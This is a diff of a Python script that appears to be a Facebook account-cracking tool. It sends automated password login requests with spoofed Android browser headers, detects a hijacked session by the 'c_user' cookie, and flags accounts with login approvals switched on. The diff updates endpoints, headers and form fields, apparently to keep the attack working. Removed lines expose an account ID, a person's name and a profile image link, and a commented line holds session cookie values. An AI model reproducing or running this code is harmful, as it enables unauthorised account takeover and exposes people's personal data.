             "server_params": {
-                "next_uri": "https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=5870af81e45750eb22160e3fe74a22f1ec7a22fa20d66f6fa34875f44676e658&wtsid=rdr_0EQ7sA15easbCjdcs",
+                "next_uri": "https://business.facebook.com/?nav_ref=biz_unified_f3_login_page_to_mbs&biz_login_source=biz_unified_f3_fb_login_button&join_id=9965d19e-bb09-4810-ab18-2b2cb4078864",
                 "credential_type": "password",
-                "username_text_input_id": "18ran1:68",
-                "password_text_input_id": "18ran1:69",
+                "username_text_input_id": "zder54:64",
+                "password_text_input_id": "zder54:65",
                 "login_source": "Login",
                 "login_credential_type": "none",
                 "server_login_source": "login",
                 "ar_event_source": "login_home_page",
                 "should_trigger_override_login_success_action": 0,
                 "should_trigger_override_login_2fa_action": 0,
-                "is_caa_perf_enabled": 1,
-                "reg_flow_source": "aymh_single_profile_native_integration_point",
+                "is_caa_perf_enabled": 0,
+                "reg_flow_source": "login_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -1914,18 +1922,17 @@ def d(uid,pwx,tl):
                 "is_from_msplit_fallback": 0,
                 "two_step_login_type": "one_step_login",
                 "is_vanilla_password_page_empty_password": 0,
-                "left_nav_button_action": "BACK",
-                "INTERNAL__latency_qpl_marker_id": 36707139,
-                "INTERNAL__latency_qpl_instance_id": "7517660500366",
+                "INTERNALlatency_qpl_marker_id": 36707139,
+                "INTERNALlatency_qpl_instance_id": "213883952800439",
                 "device_id": None,
                 "family_device_id": None,
-                "waterfall_id": "95dbfe51-b1fd-402e-9a58-1be48dc6eb61",
+                "waterfall_id": "aa106bc1-7182-4fe9-ae17-fb807c185a6f",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
                 "is_platform_login": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
-                "access_flow_version": "pre_mt_behavior"
+                "access_flow_version": "pre_mt_behavior",
             },
             "client_input_params": {
                 "machine_id": "",
@@ -1934,30 +1941,7 @@ def d(uid,pwx,tl):
                 "zero_balance_state": "",
                 "contact_point": uid,
                 "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-                "accounts_list": [{
-                    "uid": "100061465976024",
-                    "credential_type": "nonce",
-                    "token": "",
-                    "cloud_identifier": "",
-                    "obfuscated_token": None,
-                    "username": "",
-                    "encrypted_password": "",
-                    "name": "",
-                    "profile_pic_url": "",
-                    "small_profile_pic_url": None,
-                    "metadata": {
-                        "last_access_time": 0,
-                        "FXAccessLibraryAccountSavedSource": "",
-                        "previously_authenticated_nonce": "",
-                        "source_device_id": ""
-                    },
-                    "email": "",
-                    "account_source": "",
-                    "sim_phone_number": None,
-                    "encrypted_user_id": "",
-                    "lva_flow_type": None,
-                    "blob": ""
-                }],
+                "accounts_list": [],
                 "fb_ig_device_id": [],
                 "secure_family_device_id": "",
                 "encrypted_msisdn": "",
@@ -1971,74 +1955,38 @@ def d(uid,pwx,tl):
                 "client_known_key_hash": "",
                 "has_whatsapp_installed": 0,
                 "sso_token_map_json_string": "",
-                "should_show_nested_nta_from_aymh": 1,
+                "should_show_nested_nta_from_aymh": 0,
                 "password_contains_non_ascii": "false",
                 "has_granted_read_contacts_permissions": 0,
                 "has_granted_read_phone_permissions": 0,
                 "app_manager_id": "",
-                "aymh_accounts": [{
-                    "id": "100061465976024",
-                    "profiles": {
-                        "100061465976024": {
-                            "credential_type": "nonce",
-                            "name": "Jaan Amar",
-                            "is_derived": 0,
-                            "last_access_time": 0,
-                            "notification_count": 0,
-                            "password": "",
-                            "profile_picture_url": "https://scontent-ccu2-1.xx.fbcdn.net/v/t1.30497-1/453178253_471506465671661_2781666950760530985_n.png?stp=dst-png_s720x720&_nc_cat=1&ccb=1-7&_nc_sid=dfcde4&_nc_ohc=3VTDhbZZG98Q7kNvwH8iUz3&_nc_oc=AdnBmoel6-vyMY7ywJik1ESqt4VfHFvpe9uZnBCdOaDX_Hx4lR5XwoF2oRzJAgyTJ-k&_nc_zt=24&_nc_ht=scontent-ccu2-1.xx&oh=00_AflqA0FRGJe8hukDvXiQ2v-Q8gU1yqf9P-xGFNJ_kQe7LQ&oe=69691BBA",
-                            "small_profile_picture_url": None,
-                            "token": "",
-                            "user_id": "100061465976024",
-                            "username": "",
-                            "has_smartlock": 0,
-                            "account_center_id": "100061465976024",
-                            "account_source": "",
-                            "credentials": [{
-                                "credential_type": "nonce",
-                                "token": ""
-                            }],
-                            "nta_eligibility_reason": None,
-                            "from_accurate_privacy_result": 0,
-                            "encrypted_user_id": None,
-                            "dbln_validated": 0
-                        }
-                    }
-                }],
-                "network_bssid": None,
-                "lois_settings": {
-                    "lois_token": ""
-                },
-                "aac": ""
-            }
-        }
-    })
+                "aymh_accounts": [],
+                "lois_settings": {"lois_token": ""},
+                }
+        })
+    }),
 }
             headers = {
-            'Host': 'mtouch.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': 'AdEt_BZHc1I',
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
+            'authority': 'm.facebook.com',
             'accept': '*/*',
-            'origin': 'https://mtouch.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            # 'cookie': 'datr=E_QCaU0v4udGQr5o_3Wzi6sA; sb=E_QCaWJcUYmVYBh1yW_Q6xL1; m_pixel_ratio=2.75; ps_l=1; ps_n=1; dpr=2.75; locale=en_GB; vpd=v1%3B785x393x2.75; wd=393x895; fr=09qe4bO3Fv4LfIHNw..BpAvQT..AAA.0.0.BpAvbW.AWc4WjvKsreJxZCzOUWatTYXJnw',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/ig/login_via/app/?next=https%3A%2F%2Fbusiness.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_mbs%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3D9965d19e-bb09-4810-ab18-2b2cb4078864&request_id=b9baadb3-0b10-47a0-9efe-7d0759ab8d25&lid=0m1mZBc2vKpJhl663&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQF3FzHigmpMr3ET%2BMlDgnCiqr0r1cCjHy8FjEE7kyRB6A5I9zb0zNwekux%2Bzx8K5wNLSRV1Q1mw0dIsPX80QqgBF5AQpZfPRXRr1Wcq0%2FU%2BEdsomACTodidS323K5sXqPkcLQ%3D%3D',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23076PC4BI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; 23076PC4BI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/async/wbloks/fetch/"
+            url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
